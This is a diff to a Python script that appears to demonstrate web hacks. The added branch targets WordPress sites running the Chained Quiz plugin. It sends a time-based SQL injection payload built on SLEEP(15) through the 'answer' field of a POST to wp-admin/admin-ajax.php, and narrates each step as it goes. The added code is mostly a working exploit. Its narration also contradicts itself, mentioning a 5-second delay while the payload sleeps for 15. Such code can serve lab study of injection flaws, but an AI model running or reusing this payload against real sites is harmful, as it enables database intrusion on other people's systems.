@@ -36,6 +36,10 @@ try:
     if "codeigniter" in url:
         target = 2
 
+    #Is it wordpress chained quiz?
+    if 'quizexploit' in browser.title() :
+        target = 3
+
 
     #show possible hacks for the target
     if target==1:
@@ -86,6 +90,38 @@ try:
         print('Injected code:')
         print()
         print (soup.find('img'))
+
+
+    if target == 3 :
+        print ('I am going to exploit the wordpress website with the chained quiz plugin.')
+        print ('The variable answer in the post request can be subject of time-based sql injection. \n')
+        print ('I am going to inject the function SLEEP(15), that is a mySQL function.')
+        print ('This means that if I get the answer after 5 seconds the underlying database is a mySQL database.')
+
+        postdata = {
+                "answer" : '1) AND (SELECT 8561 FROM (SELECT(SLEEP(15)))UzqU) AND (1071=1071',
+                "question_id" : 1,
+                "quiz_id" : 1,
+                "question_type" : "radio",
+                "points" : 0,
+                "action" : "chainedquiz_ajax",
+                "chainedquiz_action" : "answer",
+                "total_questions" : 1
+               }
+
+        print ('Payload:')
+        print (postdata)
+
+        if url[-1] != '/':
+            url = url + '/'
+
+        url = url + 'wp-admin/admin-ajax.php'
+
+        print("requesting")
+
+        r = requests.post(url, data=postdata)
+
+        print ("done")
 
 
     elif target==0:
